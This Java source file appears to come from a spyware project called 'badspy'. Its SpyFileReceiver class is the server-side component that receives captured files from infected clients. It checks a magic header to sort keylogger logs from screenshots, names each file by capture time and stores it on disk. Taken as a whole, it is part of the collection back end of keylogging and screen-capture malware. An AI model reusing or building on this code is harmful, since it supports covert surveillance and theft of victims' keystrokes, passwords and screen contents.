package com.blogspot.sontx.badspy.badserver.bo.spyworker;

import com.blogspot.sontx.badspy.badserver.Config;
import com.blogspot.sontx.badspy.badserver.Convert;
import com.blogspot.sontx.badspy.badserver.bo.Receiver;
import com.blogspot.sontx.badspy.badserver.bo.SpyReader;
import com.blogspot.sontx.badspy.badserver.bo.SpyWriter;
import com.blogspot.sontx.jlog.Log;

import java.io.*;
import java.security.InvalidParameterException;

/**
 * Copyright 2016 by sontx
 * Created by sontx on 20/4/2016.
 */
public class SpyFileReceiver extends Receiver implements Closeable {
    private File saveDir;
    private FileOutputStream out = null;

    public SpyFileReceiver(SpyReader reader, SpyWriter writer, int fileLength, File saveDir) {
        super(reader, writer, fileLength);
        this.saveDir = saveDir;
        if (!saveDir.isDirectory())
            saveDir.mkdirs();
    }

    @Override
    public void start() throws IOException {
        byte[] buffer = new byte[Config.READ_FILE_BUFFER_SIZE];
        int totalReceivedBytes = 0;
        do {
            int receivedBytes = reader.read(buffer, 0, Math.min(dataLength - totalReceivedBytes, buffer.length));
            if (out == null) {
                try {
                    prepareFile(new byte[]{buffer[0], buffer[1]}, Convert.bytesToInteger(buffer, 2));
                    out.write(buffer, 6, receivedBytes - 6);
                } catch (InvalidParameterException e) {
                    writer.write(Config.RESPONSE_CANCEL);
                    break;
                }
            } else {
                out.write(buffer, 0, receivedBytes);
            }
            writer.write(Config.RESPONSE_OK);
            totalReceivedBytes += receivedBytes;
        } while (totalReceivedBytes < dataLength);
    }

    private void prepareFile(byte[] magic, int createdDateTime) throws InvalidParameterException, FileNotFoundException {
        String sMagic = new String(magic, 0, magic.length);
        String fileName = null;
        Log.d(String.format("File: magic = %s, seconds = %d", sMagic, createdDateTime));
        if (sMagic.equals(Config.STORAGE_MAGIC_KBFILE)) {
            fileName = String.format("%s%s", Config.STORAGE_PREFIX_KBFILE, Convert.integerToDateTime(createdDateTime));
        } else if (sMagic.equals(Config.STORAGE_MAGIC_SCROTFILE)) {
            fileName = String.format("%s%s", Config.STORAGE_PREFIX_SCROTFILE, Convert.integerToDateTime(createdDateTime));
        } else {
            throw new InvalidParameterException("Magic is invalid");
        }
        out = new FileOutputStream(new File(saveDir.getPath(), fileName));
    }

    @Override
    public void close() throws IOException {
        if (out != null)
            out.close();
    }
}
